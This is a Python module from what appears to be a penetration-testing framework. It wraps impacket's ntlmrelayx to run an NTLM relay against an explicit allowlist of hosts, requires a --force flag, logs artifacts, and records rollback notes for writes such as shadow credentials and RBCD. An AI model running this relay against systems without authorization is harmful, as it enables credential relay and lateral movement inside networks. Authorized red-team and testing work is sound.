"""NTLM relay orchestrator.

Wraps `impacket-ntlmrelayx` as a subprocess with a strict scope allowlist
(explicit --target list, no wildcards). Records the CLI, PID, and captured
artifact paths into the session so the operator can review after.

The relay itself is destructive (auto-writes to relayed services), so
`--force` is required.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _build_argv(target: Target, relay_targets: list[str], listen_port: int, output_dir: str,
                extras: list[str]) -> list[str]:
    argv = [
        "impacket-ntlmrelayx",
        "--no-http-server",  # off by default; add HTTP relay through extras when needed
        "--no-wcf-server",
        "--no-raw-server",
        "--no-smb-server",  # disabled unless caller re-enables via extras
        "-tf", "-",  # placeholder, replaced by --target list below
        "-of", output_dir,
        "-smb2support",
    ]
    for host in relay_targets:
        argv.extend(["-t", host])
    argv.extend(extras or [])
    return argv


@register_capability(
    id="ntlm-relay",
    summary="Run ntlmrelayx against a fixed allowlist of relay targets",
    category="lateral-movement",
    tags=("ntlm-relay", "ntlmrelayx", "coerce", "relay"),
    destructive=True,
)
class NtlmRelay:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        if not force:
            raise RuntimeError("ntlm-relay is destructive; pass --force to run.")

        relay_targets = kwargs.get("relay_targets")
        if isinstance(relay_targets, str):
            relay_targets = [h.strip() for h in relay_targets.split(",") if h.strip()]
        if not relay_targets:
            raise RuntimeError("Pass -P relay_targets=<host1,host2> (explicit allowlist).")
        listen_port = int(kwargs.get("listen_port", 445))
        duration_seconds = int(kwargs.get("duration_seconds", 60))
        extras_str = kwargs.get("extras") or ""
        extras = extras_str.split() if extras_str else []

        binary = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
        if not binary:
            raise RuntimeError(
                "impacket-ntlmrelayx not on PATH; install with pip install 'adaf-attack[kerberos]'."
            )

        out_dir = session.path("relay-artifacts")
        out_dir.mkdir(parents=True, exist_ok=True)
        argv = _build_argv(target, relay_targets, listen_port, str(out_dir), extras)
        argv[0] = binary

        console.print(
            f"[bold]ntlm-relay[/bold] listen=0.0.0.0:{listen_port} targets={relay_targets} "
            f"for {duration_seconds}s"
        )
        console.print(f"[dim]{' '.join(argv)}[/dim]")

        log_file = session.path("relay.log")
        with log_file.open("w", encoding="utf-8", newline="\n") as fp:
            proc = subprocess.Popen(
                argv,
                stdout=fp,
                stderr=subprocess.STDOUT,
                cwd=str(out_dir),
            )
            session.log("ntlm-relay.started", pid=proc.pid, argv=argv, targets=relay_targets)
            try:
                proc.wait(timeout=duration_seconds)
                returncode = proc.returncode
                truncated = False
            except subprocess.TimeoutExpired:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                returncode = proc.returncode if proc.returncode is not None else -1
                truncated = True

        captured = [str(p) for p in out_dir.rglob("*") if p.is_file()]
        result = {
            "listen_port": listen_port,
            "relay_targets": relay_targets,
            "duration_seconds": duration_seconds,
            "argv": argv,
            "return_code": returncode,
            "log": str(log_file),
            "artifacts": captured,
            "truncated": truncated,
        }
        out = session.path("ntlm-relay.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        session.register_cleanup(
            {
                "kind": "ntlm-relay",
                "target": ",".join(relay_targets),
                "artifact": str(log_file),
                "rollback": (
                    "Review captured artifacts for writes performed via relay "
                    "(shadow-creds, RBCD, cert enrollment, etc.) and revert as authorized."
                ),
            }
        )
        session.log(
            "ntlm-relay.complete",
            listen_port=listen_port,
            relay_targets=relay_targets,
            return_code=returncode,
            artifact_count=len(captured),
        )
        graph.save(session.path("graph.json"))
        console.print(f"[green]Done[/green]  artifacts={len(captured)}  rc={returncode}")
        return result
